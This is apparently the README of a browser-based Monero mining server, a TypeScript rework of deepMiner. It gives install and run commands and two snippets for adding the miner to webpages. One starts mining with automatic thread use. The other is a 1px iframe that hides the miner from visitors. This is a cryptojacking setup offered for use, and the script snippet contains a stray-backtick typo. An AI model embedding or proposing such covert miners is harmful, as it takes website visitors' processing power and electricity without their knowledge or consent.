# Oniric Layer

[![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)

A private XMR Server worker that work for one wallet 
complete typescript refactoring and optimization 
of https://github.com/deepwn/deepMiner


## Installation (On server)

* First Usage
```sh
 
  npm i

```
* Development Mode
```sh
 
 npm run compile
 npm run dev
```

* Production Mode
```sh
 
 npm run compile
 npm run prod
 
```

* Considerations

to run executable generated by pkg you must modify package.json file
go to dist/build and copy oniric , config.json and web directory
put copied files via ftp on a web server and start with pm2 oniric executable


## Usage (Add to webpage)

* Classic Config

```
<script src="server/lib/oniric.min.js"> </script>
<script> var userID = 'Oniric';
         var miner = new Oniric.Init(userID, {
         	autoThreads: true`
         });
         miner.start(); 
 </script>
```

* IFrame Based

```
<iframe style="display:block" width="1px" height="1px" src="yourserver:port/miner.html"></iframe>
```
